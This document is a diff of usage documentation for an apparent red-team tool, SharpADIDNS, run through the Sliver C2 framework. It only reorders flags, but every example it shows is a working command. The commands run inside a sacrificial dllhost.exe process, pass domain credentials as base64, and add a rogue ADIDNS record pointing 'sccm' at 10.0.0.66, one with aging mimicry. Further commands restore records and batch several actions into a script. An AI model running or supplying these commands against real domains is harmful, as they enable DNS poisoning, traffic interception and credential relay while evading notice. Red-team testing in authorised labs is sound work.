@@ -376,16 +376,13 @@ $ printf 'RedteamN0t3s.' | base64
 UmVkdGVhbU4wdDNzLg==
 
 # in Sliver console:
-sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe -- \
-    --c2 \
-    --username 'redteamnotes\redpen' \
-    --password-base64 UmVkdGVhbU4wdDNzLg== \
+sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
     add \
-    --zone redteamnotes.local \
-    --name sccm \
-    --type A --data 10.0.0.66 \
-    --dn DC=redteamnotes,DC=local \
-    --server dc.redteamnotes.local
+        --c2 \
+        --username 'redteamnotes\redpen' \
+        --password-base64 UmVkdGVhbU4wdDNzLg== \
+        --zone redteamnotes.local --dn DC=redteamnotes,DC=local --server dc.redteamnotes.local \
+        --name sccm --type A --data 10.0.0.66
 ```
 
 `--c2` flips on a coherent set of defaults (no FUD warnings, no prompts, no color, quiet, `--format json`, `--backup-to -` to stdout). `--password-base64` is the only password source that survives Sliver's multi-layer command parsing cleanly when the password contains `'`, `"`, `$`, or spaces.
@@ -423,17 +420,14 @@ Receipt schema:
 
 ```bash
 # from the receipt's previous_state.records_base64, restore each one
-sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe -- \
-    --c2 \
-    --username 'redteamnotes\redpen' \
-    --password-base64 UmVkdGVhbU4wdDNzLg== \
+sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
     add \
-    --raw <base64-from-previous_state> \
-    --force \
-    --zone redteamnotes.local \
-    --name sccm \
-    --dn DC=redteamnotes,DC=local \
-    --server dc.redteamnotes.local
+        --c2 \
+        --username 'redteamnotes\redpen' \
+        --password-base64 UmVkdGVhbU4wdDNzLg== \
+        --zone redteamnotes.local --dn DC=redteamnotes,DC=local --server dc.redteamnotes.local \
+        --name sccm \
+        --raw <base64-from-previous_state> --force
 ```
 
 ### Sacrificial process choice
@@ -465,13 +459,11 @@ This is a Sliver-side knob (`execute-assembly -p <process.exe>`), not a SharpADI
 A single `execute-assembly` invocation runs multiple actions. Statements are `;`-separated; each statement is a regular action verb with its own flags, applied on top of the outer flags (which become defaults).
 
 ```bash
-sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe -- \
+sliver > execute-assembly SharpADIDNS.exe -p dllhost.exe -- \
     --c2 \
     --username 'redteamnotes\redpen' \
     --password-base64 UmVkdGVhbU4wdDNzLg== \
-    --zone redteamnotes.local \
-    --dn DC=redteamnotes,DC=local \
-    --server dc.redteamnotes.local \
+    --zone redteamnotes.local --dn DC=redteamnotes,DC=local --server dc.redteamnotes.local \
     --script "
         enum;
         add --name sccm --type A --data 10.0.0.66 --mimic-aging;
